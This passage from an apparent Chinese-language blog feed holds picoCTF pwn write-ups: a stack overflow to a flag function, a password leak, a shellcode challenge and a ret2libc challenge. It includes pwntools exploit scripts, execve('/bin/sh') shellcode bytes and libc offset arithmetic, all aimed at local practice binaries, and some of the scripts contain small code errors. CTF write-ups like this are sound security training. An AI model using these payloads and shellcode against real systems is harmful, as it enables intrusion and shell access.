Type <span class="token string">"help"</span><span class="token punctuation">,</span> <span class="token string">"copyright"</span><span class="token punctuation">,</span> <span class="token string">"credits"</span> <span class="token operator">or</span> <span class="token string">"license"</span> <span class="token keyword">for</span> more information<span class="token punctuation">.</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token operator">>></span><span class="token operator">></span> payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span><span class="token string">'bbbb'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x80485CB</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> p <span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./vuln'</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>x<span class="token punctuation">]</span> Starting local process <span class="token string">'./vuln'</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./vuln'</span><span class="token punctuation">:</span> pid <span class="token number">856860</span>
<span class="token operator">>></span><span class="token operator">></span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Process <span class="token string">'./vuln'</span> stopped <span class="token keyword">with</span> exit code <span class="token operator">-</span><span class="token number">11</span> <span class="token punctuation">(</span>SIGSEGV<span class="token punctuation">)</span> <span class="token punctuation">(</span>pid <span class="token number">856860</span><span class="token punctuation">)</span>
Please enter your string<span class="token punctuation">:</span> 
Okay<span class="token punctuation">,</span> time to <span class="token keyword">return</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> Fingers Crossed<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> Jumping to <span class="token number">0x80485cb</span>
picoCTF<span class="token punctuation">{</span>addr3ss3s_ar3_3asy65489706<span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive
</code></pre>
<p>成功获取到flag</p>
<p><img src="/2018/10/02/picoctf-Writeup/2.jpg" alt="2"></p>
<h3 id="leak-me"><a href="#leak-me" class="headerlink" title="leak-me"></a>leak-me</h3><p>查看源代码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>

<span class="token keyword">int</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  FILE <span class="token operator">*</span>file<span class="token punctuation">;</span>
  file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">{</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">// Set the gid to the effective gid</span>
  gid_t gid <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span> gid<span class="token punctuation">,</span> gid<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">// real pw: </span>
  FILE <span class="token operator">*</span>file<span class="token punctuation">;</span>
  <span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> password_input<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">memset</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>password_input<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password_input<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What is your name?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fgets</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>end <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token operator">*</span>end <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">strcat</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">",\nPlease Enter the Password."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"password.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">fgets</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> 

  <span class="token function">fgets</span><span class="token punctuation">(</span>password_input<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password_input<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  password_input<span class="token punctuation">[</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>password_input<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password_input<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>看到name 定义为 char name[256];</p>
<p>我们只需要大于0x100长度的字符串即可leak处password</p>
<h4 id="这里先讲一下如何修复"><a href="#这里先讲一下如何修复" class="headerlink" title="这里先讲一下如何修复"></a>这里先讲一下如何修复</h4><p>如果用ida32打开程序的话会无法F5</p>
<p><img src="/2018/10/02/picoctf-Writeup/3.jpg" alt="3"></p>
<p>如图 </p>
<p>这是因为反编译插件无法确定其中函数的参数个数 </p>
<p>解决方法：</p>
<p>跳转到该地址 </p>
<p><img src="/2018/10/02/picoctf-Writeup/4.jpg" alt="4"></p>
<p><img src="/2018/10/02/picoctf-Writeup/5.jpg" alt="5"></p>
<p>进入该函数 按 Y 修改函数约定和参数个数 </p>
<p><img src="/2018/10/02/picoctf-Writeup/6.jpg" alt="6"></p>
<p>然后再按F5</p>
<p>接着切换到main函数 即可成功F5反编译</p>
<p><img src="/2018/10/02/picoctf-Writeup/7.jpg" alt="7"></p>
<p>由于断电 这里先进行本地getflag</p>
<p><img src="/2018/10/02/picoctf-Writeup/Users\TTTR\ios\source\_posts\picoctf-Writeup\8.jpg" alt="8"></p>
<p>leak出本地password</p>
<p>再次输入password即可获取到flag</p>
<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec shellcode
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/shellcode'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
    RWX:      Has RWX segments
ios@ubuntu:~$
</code></pre>
<p>保护全关 所以只要写入shellcode即可</p>
<p><img src="/2018/10/02/picoctf-Writeup/9.jpg" alt="9"></p>
<p>F5报错 </p>
<p>修复办法 ：</p>
<p>G跟进地址</p>
<p><img src="/2018/10/02/picoctf-Writeup/10.jpg" alt="10"></p>
<p>keypatch该指令 用nop填充</p>
<p><img src="/2018/10/02/picoctf-Writeup/11.jpg" alt="11"></p>
<p>再次按F5</p>
<p><img src="/2018/10/02/picoctf-Writeup/12.jpg" alt="12"></p>
<p>分析代码流程</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-A0h]</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+9Ch] [ebp-Ch]</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter a string!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Thanks! Executing now..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>v4传入vuln函数 跟进</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token comment" spellcheck="true">//v4)</span>
<span class="token punctuation">{</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//漏洞存在点</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>溢出偏移 0xA0</p>
<p>使用现有的shellcode 或者生产shellcode</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'i386'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>
shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">//</span>现有
shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"</span>
</code></pre>
<p>那么构造exp</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
p <span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./shellcode'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'shellcode'</span><span class="token punctuation">)</span>
bss <span class="token operator">=</span>elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"</span>

payload <span class="token operator">=</span> shellcode<span class="token operator">+</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xA0</span><span class="token operator">-</span>len<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'bbbb'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1553155</span><span class="token punctuation">)</span><span class="token operator">//</span>随意给出一个ret地址
p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="got-2-learn-libc"><a href="#got-2-learn-libc" class="headerlink" title="got-2-learn-libc"></a>got-2-learn-libc</h3><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ checksec got2libc
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/got2libc'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
ubuntu@ubuntu:~$
</code></pre>
<p>开启PIE NX RELRO</p>
<p>载入ida查看流程</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __gid_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"puts: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>puts<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fflush %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fflush<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>read<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"write: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>write<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"useful_string: %p\n"</span><span class="token punctuation">,</span> useful_string<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>主流程打印了当前的一些地址  看到还打印了一个useful_string 我们跟进看下 是什么</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002030</span>                 public useful_string
<span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002030</span> useful_string   db <span class="token string">'/bin/sh'</span><span class="token punctuation">,</span><span class="token number">0</span>          <span class="token punctuation">;</span> DATA XREF<span class="token punctuation">:</span> main<span class="token operator">+</span>C9↑o
<span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002038</span>                 align 10h
<span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002038</span> _data           ends
</code></pre>
<p>看到存的binsh</p>
<p>跟进vuln函数</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-9Ch]</span>

  <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在溢出</span>
  <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>漏洞点也很明显</p>
<p>思路：</p>
<p>由于程序打印了puts地址 所以可以根据puts_addr找到libc版本</p>
<p>通过计算libc_base 从而计算出system_addr</p>
<p>题目已给出/bin/sh地址所以我们可以直接构造payload</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'got2libc'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'got2libc'</span><span class="token punctuation">)</span>
puts_plt_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
putsaddr <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
puts<span class="token operator">=</span> putsaddr<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">]</span>
binsh<span class="token operator">=</span> putsaddr<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">:</span><span class="token number">128</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true">#puts_plt = 0xf7e0618</span>
<span class="token comment" spellcheck="true">#puts_got = 0xf7e01fe4</span>
<span class="token comment" spellcheck="true">#payload = 'A'*0x9C+'bbbb'+p32(puts_plt)+p32(0xf7e0803)+p32(puts_got)</span>

<span class="token comment" spellcheck="true">#p.sendline(payload)</span>
<span class="token comment" spellcheck="true">#log.info(p.recvuntil('Thanks! Exiting now...\n'))</span>
<span class="token comment" spellcheck="true">#data = p.recvuntil('\n', drop=True)</span>
<span class="token comment" spellcheck="true">#puts = u32(data.ljust(4,'\x00'))</span>

system <span class="token operator">=</span> int<span class="token punctuation">(</span>puts<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x05fca0</span><span class="token operator">+</span><span class="token number">0x03ada0</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x9C</span><span class="token operator">+</span><span class="token string">'bbbb'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>int<span class="token punctuation">(</span>binsh<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>注意str与int的转换</p>
<p>这里的system计算是通过<a href="https://libc.blukat.me" target="_blank" rel="external">https://libc.blukat.me</a></p>
<p><img src="/2018/10/02/picoctf-Writeup/13.jpg" alt="13"></p>
<p><img src="/2018/10/02/picoctf-Writeup/14.jpg" alt="14"></p>
<p>成功拿到shell</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;buffer-overflow-0&quot;&gt;&lt;a href=&quot;#buffer-overflow-0&quot; class=&quot;headerlink&quot; title=&quot;buffer overflow 0&quot;&gt;&lt;/a&gt;buffer overflow 0&lt;/h3&gt;&lt;p&gt;查看程序源代码&lt;/p
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网鼎杯部分PWN-Writeup</title>
    <link href="http://iosmosis.github.io/2018/08/22/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%83%A8%E5%88%86PWN-Writeup/"/>
    <id>http://iosmosis.github.io/2018/08/22/网鼎杯部分PWN-Writeup/</id>
    <published>2018-08-22T04:58:03.000Z</published>
    <updated>2019-09-12T04:46:11.634Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一场"><a href="#第一场" class="headerlink" title="第一场"></a>第一场</h2><h3 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h3><p>SSP leak flag</p>
<p>这次学到了一个知识点 environ存在栈地址</p>
<p>三次leak得到flag</p>
